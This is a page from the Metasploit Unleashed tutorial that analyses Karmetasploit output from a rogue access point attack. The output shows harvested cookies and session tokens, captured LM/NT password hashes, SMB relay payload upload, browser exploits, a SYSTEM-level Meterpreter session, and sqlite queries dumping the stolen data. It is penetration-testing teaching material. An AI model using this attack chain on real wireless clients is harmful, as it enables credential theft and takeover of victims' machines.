<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Karmetasploit Attack Analysis</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Karmetasploit
Attack Analysis</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">Wow! That was a lot of output! Please
take some time to read through the output, and try to understand what
is happening.
</p>
<p style="color: rgb(0, 0, 0);">Let's break down some of the output a
bit here.
<br>
<br>
</p>
<pre id="code">[*] DNS 10.0.0.100:1284 XID 92 (IN::A ecademy.com)<br>[*] DNS 10.0.0.100:1286 XID 93 (IN::A facebook.com)<br>[*] DNS 10.0.0.100:1286 XID 93 (IN::A facebook.com)<br>[*] DNS 10.0.0.100:1287 XID 94 (IN::A gather.com)<br>[*] DNS 10.0.0.100:1287 XID 94 (IN::A gather.com)</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Here we see DNS lookups which are
occurring. Most of these are
initiated by Karmetasploit in attempts to gather information from the
client.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">[*] HTTP REQUEST 10.0.0.100 &gt; gmail.google.com:80 GET /forms.html Windows IE 5.01 cook<br>ies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880: S=snePRUjY-zgcXpEV;NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6h I1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8<br><br>[*] HTTP REQUEST 10.0.0.100 &gt; google.com:80 GET /forms.html Windows IE 5.01 cookies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880: S=snePRUjY-zgcXpEV;NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4e FCH6hI1ae23g hwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Here we can see Karmetasploit
collecting cookie information from
the client. This could be useful information to use in attacks against
the user later on.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">[*] Received 10.0.0.100:1362 TARGET\P0WN3D LMHASH:47a8cfba21d8473f9cc1674cedeba0fa6dc1c2a4dd904b72 NTHASH:ea389b305cd095d32124597122324fc470ae8d9205bdfc19 OS:Windows 2000 2195 LM:Windows 2000 5.0<br>[*] Authenticating to 10.0.0.100 as TARGET\P0WN3D...<br>[*] AUTHENTICATED as TARGET\P0WN3D...<br>[*] Connecting to the ADMIN$ share...<br>[*] Regenerating the payload...<br>[*] Uploading payload...<br>[*] Obtaining a service manager handle...<br>[*] Creating a new service...<br>[*] Closing service handle...<br>[*] Opening service...<br>[*] Starting the service...<br>[*] Transmitting intermediate stager for over-sized stage...(191 bytes)<br>[*] Removing the service...<br>[*] Closing service handle...<br>[*] Deleting UxsjordQ.exe...<br>[*] Sending Access Denied to 10.0.0.100:1362 TARGET\P0WN3D<br>[*] Received 10.0.0.100:1362 LMHASH:00 NTHASH: OS:Windows 2000 2195 LM:Windows 2000 5.0<br>[*] Sending Access Denied to 10.0.0.100:1362<br>[*] Received 10.0.0.100:1365 TARGET\P0WN3D LMHASH:3cd170ac4f807291a1b90da20bb8eb228cf50aaf5373897d NTHASH:ddb2b9bed56faf557b1a35d3687fc2c8760a5b45f1d1f4cd OS:Windows 2000 2195 LM:Windows 2000 5.0<br>[*] Authenticating to 10.0.0.100 as TARGET\P0WN3D...<br>[*] AUTHENTICATED as TARGET\P0WN3D...<br>[*] Ignoring request from 10.0.0.100, attack already in progress.<br>[*] Sending Access Denied to 10.0.0.100:1365 TARGET\P0WN3D<br>[*] Sending Apple QuickTime 7.1.3 RTSP URI Buffer Overflow to 10.0.0.100:1278...<br>[*] Sending stage (2650 bytes)<br>[*] Sending iPhone MobileSafari LibTIFF Buffer Overflow to 10.0.0.100:1367...<br>[*] HTTP REQUEST 10.0.0.100 &gt; www.care2.com:80 GET / Windows IE 5.01 cookies=<br>[*] Sleeping before handling stage...<br>[*] HTTP REQUEST 10.0.0.100 &gt; www.yahoo.com:80 GET / Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; yahoo.com:80 GET / Windows IE 5.01 cookies=<br>[*] Uploading DLL (75787 bytes)...<br>[*] Upload completed.<br>[*] Migrating to lsass.exe...<br>[*] Current server process: rundll32.exe (848)<br>[*] New server process: lsass.exe (232)<br>[*] Meterpreter session 1 opened (10.0.0.1:45017 -&gt; 10.0.0.100:1364)</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Here is where it gets really
interesting! We have obtained the
password hashes from the system, which can then be used to identify the
actual passwords. This is followed by the creation of a Meterpreter
session.
</span>
<p style="color: rgb(0, 0, 0);">Now we have access to the system, lets
see what we can do with it.
<br>
<br>
</p>
<pre id="code">msf auxiliary(http) &gt; sessions -i 1<br>[*] Starting interaction with 1...<br><br><u>meterpreter</u> &gt; ps<br><br>Process list<br>============<br><br>    PID   Name               Path                                                          <br>    ---   ----               ----                                                          <br>    144   smss.exe           \SystemRoot\System32\smss.exe                                 <br>    172   csrss.exe          \??\C:\WINNT\system32\csrss.exe                               <br>    192   winlogon.exe       \??\C:\WINNT\system32\winlogon.exe                            <br>    220   services.exe       C:\WINNT\system32\services.exe                                <br>    232   lsass.exe          C:\WINNT\system32\lsass.exe                                   <br>    284   firefox.exe        C:\Program Files\Mozilla Firefox\firefox.exe                  <br>    300   KodakImg.exe       C:\Program Files\Windows NT\Accessories\ImageVueKodakImg.exe <br>    396   svchost.exe        C:\WINNT\system32\svchost.exe                                 <br>    416   spoolsv.exe        C:\WINNT\system32\spoolsv.exe                                 <br>    452   svchost.exe        C:\WINNT\System32\svchost.exe                                 <br>    488   regsvc.exe         C:\WINNT\system32\regsvc.exe                                  <br>    512   MSTask.exe         C:\WINNT\system32\MSTask.exe                                  <br>    568   VMwareService.exe  C:\Program Files\VMware\VMware Tools\VMwareService.exe        <br>    632   WinMgmt.exe        C:\WINNT\System32\WBEM\WinMgmt.exe                            <br>    696   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe        <br>    760   Explorer.exe       C:\WINNT\Explorer.exe                                         <br>    832   VMwareTray.exe     C:\Program Files\VMware\VMware Tools\VMwareTray.exe           <br>    848   rundll32.exe       C:\WINNT\system32\rundll32.exe                                <br>    860   VMwareUser.exe     C:\Program Files\VMware\VMware Tool\VMwareUser.exe           <br>    884   RtWLan.exe         C:\Program Files\ASUS WiFi-AP Solo\RtWLan.exe                 <br>    916   TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe        <br>    952   SCardSvr.exe       C:\WINNT\System32\SCardSvr.exe                                <br>    1168  IEXPLORE.EXE       C:\Program Files\Internet Explorer\IEXPLORE.EXE               <br><br><u>meterpreter</u> &gt; ipconfig /all<br><br>VMware Accelerated AMD PCNet Adapter<br>Hardware MAC: 00:0c:29:85:81:55<br>IP Address  : 0.0.0.0<br>Netmask     : 0.0.0.0<br><br><br><br>Realtek RTL8187 Wireless LAN USB NIC                                    <br>Hardware MAC: 00:c0:ca:1a:e7:d4<br>IP Address  : 10.0.0.100<br>Netmask     : 255.255.255.0<br><br><br><br>MS TCP Loopback interface<br>Hardware MAC: 00:00:00:00:00:00<br>IP Address  : 127.0.0.1<br>Netmask     : 255.0.0.0<br><br><br><u>meterpreter</u> &gt; pwd<br>C:\WINNT\system32<br><u>meterpreter</u> &gt; getuid<br>Server username: NT AUTHORITY\SYSTEM</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Wonderful. Just like any other
vector, our Meterperter session is working just as we expected.
</span>
<p style="color: rgb(0, 0, 0);">However, there can be a lot that
happens in Karmetasploit really
fast and making use of the output to standard out may not be usable.
Let's look at another way to access the logged information. We will
interact with the karma.db that is created in your home directory.
</p>
<p style="color: rgb(0, 0, 0);">Lets open it with sqlite, and dump the
schema.
<br>
<br>
</p>
<pre id="code">root@bt4:~# sqlite3 karma.db<br>SQLite version 3.5.9<br>Enter ".help" for instructions<br>sqlite&gt; .schema<br>CREATE TABLE hosts (<br>'id' INTEGER PRIMARY KEY NOT NULL,<br>'created' TIMESTAMP,<br>'address' VARCHAR(16) UNIQUE,<br>'comm' VARCHAR(255),<br>'name' VARCHAR(255),<br>'state' VARCHAR(255),<br>'desc' VARCHAR(1024),<br>'os_name' VARCHAR(255),<br>'os_flavor' VARCHAR(255),<br>'os_sp' VARCHAR(255),<br>'os_lang' VARCHAR(255),<br>'arch' VARCHAR(255)<br>);<br>CREATE TABLE notes (<br>'id' INTEGER PRIMARY KEY NOT NULL,<br>'created' TIMESTAMP,<br>'host_id' INTEGER,<br>'ntype' VARCHAR(512),<br>'data' TEXT<br>);<br>CREATE TABLE refs (<br>'id' INTEGER PRIMARY KEY NOT NULL,<br>'ref_id' INTEGER,<br>'created' TIMESTAMP,<br>'name' VARCHAR(512)<br>);<br>CREATE TABLE reports (<br>'id' INTEGER PRIMARY KEY NOT NULL,<br>'target_id' INTEGER,<br>'parent_id' INTEGER,<br>'entity' VARCHAR(50),<br>'etype' VARCHAR(50),<br>'value' BLOB,<br>'notes' VARCHAR,<br>'source' VARCHAR,<br>'created' TIMESTAMP<br>);<br>CREATE TABLE requests (<br>'host' VARCHAR(20),<br>'port' INTEGER,<br>'ssl' INTEGER,<br>'meth' VARCHAR(20),<br>'path' BLOB,<br>'headers' BLOB,<br>'query' BLOB,<br>'body' BLOB,<br>'respcode' VARCHAR(5),<br>'resphead' BLOB,<br>'response' BLOB,<br>'created' TIMESTAMP<br>);<br>CREATE TABLE services (<br>'id' INTEGER PRIMARY KEY NOT NULL,<br>'host_id' INTEGER,<br>'created' TIMESTAMP,<br>'port' INTEGER NOT NULL,<br>'proto' VARCHAR(16) NOT NULL,<br>'state' VARCHAR(255),<br>'name' VARCHAR(255),<br>'desc' VARCHAR(1024)<br>);<br>CREATE TABLE targets (<br>'id' INTEGER PRIMARY KEY NOT NULL,<br>'host' VARCHAR(20),<br>'port' INTEGER,<br>'ssl' INTEGER,<br>'selected' INTEGER<br>);<br>CREATE TABLE vulns (<br>'id' INTEGER PRIMARY KEY NOT NULL,<br>'service_id' INTEGER,<br>'created' TIMESTAMP,<br>'name' VARCHAR(1024),<br>'data' TEXT<br>);<br>CREATE TABLE vulns_refs (<br>'ref_id' INTEGER,<br>'vuln_id' INTEGER<br>);</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">With the information gained from the
schema, let's interact with
the data we have gathered. First, we will list all the systems that we
logged information from, then afterward, dump all the information we
gathered while they were connected.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">sqlite&gt; select * from hosts;<br>1|2009-05-09 23:47:04|10.0.0.100|||alive||Windows|2000|||x86<br>sqlite&gt; select * from notes where host_id = 1;<br>1|2009-05-09 23:47:04|1|http_cookies|en-us.start2.mozilla.com __utma=183859642.1221819733.1241334886.1241334886.1241334886.1; __utmz=183859642.1241334886.1.1.utmccn=(organic)|utmcsr=google|utmctr=firefox|utmcmd=organic<br>2|2009-05-09 23:47:04|1|http_request|en-us.start2.mozilla.com:80 GET /firefox Windows FF 1.9.0.10<br>3|2009-05-09 23:47:05|1|http_cookies|adwords.google.com PREF=ID=ee60297d21c2a6e5:U=ecaec12d78faa1ba:TM=1241913986:LM=1241926890:GM=1:S=-p5nGxSz_oh1inss; NID=22=Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID=DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq<br>4|2009-05-09 23:47:05|1|http_request|adwords.google.com:80 GET /forms.html Windows FF 1.9.0.10<br>5|2009-05-09 23:47:05|1|http_request|blogger.com:80 GET /forms.html Windows FF 1.9.0.10<br>6|2009-05-09 23:47:05|1|http_request|care.com:80 GET /forms.html Windows FF 1.9.0.10<br>7|2009-05-09 23:47:05|1|http_request|0.0.0.0:55550 GET /ads Windows Firefox 3.0.10<br>8|2009-05-09 23:47:06|1|http_request|careerbuilder.com:80 GET /forms.html Windows FF 1.9.0.10<br>9|2009-05-09 23:47:06|1|http_request|ecademy.com:80 GET /forms.html Windows FF 1.9.0.10<br>10|2009-05-09 23:47:06|1|http_cookies|facebook.com datr=1241925583-120e39e88339c0edfd73fab6428ed813209603d31bd9d1dccccf3; ABT=::#b0ad8a8df29cc7bafdf91e67c86d58561st0:1242530384:A#2dd086ca2a46e9e50fff44e0ec48cb811st0:1242530384:B; s_vsn_facebookpoc_1=7269814957402<br>11|2009-05-09 23:47:06|1|http_request|facebook.com:80 GET /forms.html Windows FF 1.9.0.10<br>12|2009-05-09 23:47:06|1|http_request|gather.com:80 GET /forms.html Windows FF 1.9.0.10<br>13|2009-05-09 23:47:06|1|http_request|gmail.com:80 GET /forms.html Windows FF 1.9.0.10<br>14|2009-05-09 23:47:06|1|http_cookies|gmail.google.com PREF=ID=ee60297d21c2a6e5:U=ecaec12d78faa1ba:TM=1241913986:LM=1241926890:GM=1:S=-p5nGxSz_oh1inss; NID=22=Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID=DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq<br>15|2009-05-09 23:47:07|1|http_request|gmail.google.com:80 GET /forms.html Windows FF 1.9.0.10<br>16|2009-05-09 23:47:07|1|http_cookies|google.com PREF=ID=ee60297d21c2a6e5:U=ecaec12d78faa1ba:TM=1241913986:LM=1241926890:GM=1:S=-p5nGxSz_oh1inss; NID=22=Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID=DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq<br>17|2009-05-09 23:47:07|1|http_request|google.com:80 GET /forms.html Windows FF 1.9.0.10<br>18|2009-05-09 23:47:07|1|http_request|linkedin.com:80 GET /forms.html Windows FF 1.9.0.10<br><br>101|2009-05-09 23:50:03|1|http_cookies|safebrowsing.clients.google.com PREF=ID=ee60297d21c2a6e5:U=ecaec12d78faa1ba:TM=1241913986:LM=1241926890:GM=1:S=-p5nGxSz_oh1inss; NID=22=Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID=DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq<br>102|2009-05-09 23:50:03|1|http_request|safebrowsing.clients.google.com:80 POST /safebrowsing/downloads Windows FF 1.9.0.10<br>108|2009-05-10 00:43:29|1|http_cookies|twitter.com auth_token=1241930535--c2a31fa4627149c521b965e0d7bdc3617df6ae1f<br>109|2009-05-10 00:43:29|1|http_cookies|www.twitter.com auth_token=1241930535--c2a31fa4627149c521b965e0d7bdc3617df6ae1f<br>sqlite&gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Very useful. Think of the number of
ways this can be utilized.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Karmetasploit"
 title="Karmetasploit">Karmetasploit</a></div>
</body>
</html>
